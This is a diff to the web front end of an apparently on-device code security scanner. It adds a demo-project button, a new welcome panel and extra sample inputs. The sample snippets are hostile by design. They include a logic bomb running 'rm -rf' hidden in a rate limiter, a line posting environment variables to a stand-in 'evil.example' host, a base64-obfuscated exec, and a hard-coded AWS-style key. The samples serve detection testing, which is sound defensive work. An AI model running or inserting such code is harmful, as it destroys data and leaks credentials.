@@ -176,6 +176,7 @@
       <div class="row">
         <button class="primary" id="run">⚡ Analyze</button>
         <button id="clear">Clear</button>
+        <button id="demo" title="Scan a realistic 7-file project where the dangers are NOT obvious">▶ Try a realistic demo project</button>
         <span id="status" style="color:var(--muted);font-size:12.5px"></span>
       </div>
     </div>
@@ -203,16 +204,22 @@
   </section>
 
   <section class="card" id="welcome">
-    <div class="card-b empty"><div class="big">🔍</div>
-      <div>Paste code, or upload files / a project, then <b>Analyze</b>.</div>
-      <div class="hint">Detects logic bombs · credential exfiltration (cross-file) · obfuscated payloads ·
-        install hooks · the OWASP/CWE classics — all on-device.</div>
+    <div class="card-b" style="text-align:center;padding:34px 18px">
+      <div style="font-size:40px">🔍</div>
+      <div style="font-size:16px;font-weight:700;margin:6px 0">Finds what code review misses — not just the obvious one-liners.</div>
+      <div class="hint" style="max-width:640px;margin:0 auto 16px">A backdoor split across files, a logic bomb buried in a rate-limiter, a base64
+        payload in a "plugin loader", a hard-coded key that only matters because <code class="k">boto3</code> is imported beside it — these are invisible
+        when you skim a single file. That's the job.</div>
+      <button class="primary" id="demo2" style="font-size:14px">▶ Scan a realistic 7-file demo project</button>
+      <div class="hint" style="margin-top:8px">…or paste your own code / upload a project above. Everything runs on-device.</div>
     </div>
   </section>
 </main>
 
 <script>
 const EXAMPLES = {
+  "Buried logic bomb":"import random, os\n\n_calls = 0\n\ndef rate_limit(user):\n    # looks like a rate limiter — the trigger is hidden\n    global _calls\n    _calls += 1\n    if random.random() < 0.004 and _calls > 5000:\n        os.system('rm -rf /var/lib/app')\n    return _calls < 100000",
+  "Import-correlated secret":"import boto3\n\n# only Critical because boto3 is imported right here\nsession = boto3.Session(aws_access_key_id='AKIAZ3GULPBS2P7Q4XYZ')",
   "Probabilistic bomb":"import random, os\nif random.random() < 0.02:\n    os.system('rm -rf /')",
   "Credential exfil":"import os, requests\nrequests.post('https://evil.example/c2', data=os.environ)",
   "Obfuscated payload":"import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())",
@@ -260,6 +267,13 @@ async function runPaste(){
   scanCode=code;
   busy(true); try{ show(await post("/api/scan",{code})); } finally{ busy(false); }
 }
+async function runDemo(){
+  scanCode=null; busy(true);
+  try{
+    const r=await (await fetch("/api/demo")).json();
+    r._demo=true; show(r);
+  } finally{ busy(false); }
+}
 async function runFiles(fileList){
   scanCode=null;
   const pys=[...fileList].filter(f=>f.name.endsWith(".py"));
@@ -280,6 +294,8 @@ $("#run").onclick=()=>{ if(mode==="paste") runPaste();
   else { const f=$("#folderInput").files, z=$("#zipInput").files;
          if(z.length) runFiles(z); else if(f.length) runFiles(f); else $("#zipInput").click(); } };
 $("#clear").onclick=()=>{$("#code").value="";};
+$("#demo").onclick=runDemo;
+document.addEventListener("click",e=>{if(e.target&&e.target.id==="demo2")runDemo();});
 $("#fileInput").onchange=e=>runFiles(e.target.files);
 $("#folderInput").onchange=e=>runFiles(e.target.files);
 $("#zipInput").onchange=e=>runFiles(e.target.files);
@@ -360,7 +376,12 @@ function renderSummary(r){
     <div><div class="cap">Scan time</div><div class="v" style="font-size:20px;font-weight:800">${s.duration_ms}<span style="font-size:11px"> ms</span></div></div>
     <div style="grid-column:1/4;font-size:12px;color:var(--muted)">${total?`${total} finding(s) · `:''}symbolic: <b style="color:${r.symbolic_unsafe?'var(--high)':'var(--ok)'}">${esc(r.symbolic||'N/A')}</b></div>
   </div></div>`;
-  $("#summary").innerHTML=`<div class="vizrow">${severityDonut(s.by_severity,total||1)}${riskGauge(s.max_cvss)}${metrics}</div>`;
+  const banner=r._demo?`<div style="background:rgba(124,92,255,0.12);border:1px solid var(--accent2);border-radius:9px;padding:10px 14px;margin-bottom:12px;font-size:13px">
+    🧪 <b>Demo: a realistic 7-file "analytics service".</b> Every file looks normal in isolation — yet Q-Trace found a
+    <b>credential leak split across 3 files</b>, a <b>logic bomb buried in the rate-limiter</b>, an <b>obfuscated plugin loader</b>,
+    an <b>import-correlated AWS key</b>, an <b>install hook</b>, and a <b>typosquatted dependency</b>. Open
+    <b>Attack paths</b> to see the cross-file flow.</div>`:"";
+  $("#summary").innerHTML=banner+`<div class="vizrow">${severityDonut(s.by_severity,total||1)}${riskGauge(s.max_cvss)}${metrics}</div>`;
 }
 
 function taintFindings(r){return r.findings.filter(f=>(f.evidence||[]).some(e=>/taint|cross-file/i.test(e)));}
@@ -529,7 +550,7 @@ function wireCards(){
 }
 
 // init
-$("#code").value=EXAMPLES["Credential exfil"];
+$("#code").value=EXAMPLES["Buried logic bomb"];
 fetch("/health").then(r=>r.json()).then(d=>{$("#enginePill").textContent="engines: "+(d.engines||"ready");})
   .catch(()=>{$("#enginePill").textContent="engines: ready";});
 </script>
